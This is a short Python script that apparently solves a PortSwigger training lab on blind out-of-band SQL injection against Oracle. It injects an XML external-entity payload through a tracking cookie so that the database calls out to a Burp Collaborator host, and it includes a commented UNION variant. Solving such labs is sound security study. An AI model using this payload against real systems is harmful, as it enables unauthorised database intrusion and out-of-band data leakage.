import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
import urllib.parse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
# db: OracleDB
# author: 0xyf


class SQLi16:
    def __init__(self):
        self.lab_id = "0a7b00fb04482a6c82221f0400d60085"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.collab_url = "http://orjzcypf0y0l0musudijpgzquh0doec3.oastify.com"

    def execute_request(self, payload):
        payload = urllib.parse.quote(payload, safe="")
        cookies = {"TrackingId": payload}
        r = requests.get(self.url, proxies=self.proxies, cookies=cookies, verify=False)
        return r

    def dns_lookup(self):
        payload = f"""'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "{self.collab_url}"> %remote;]>'),'/l') FROM dual) -- -"""
        # payload = f"""' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "{self.collab_url}"> %remote;]>'),'/l') FROM dual -- -""" # using 'UNION
        self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dns_lookup()
        self.check_solved()


def main():
    SQLi16().solve()


if __name__ == "__main__":
    main()
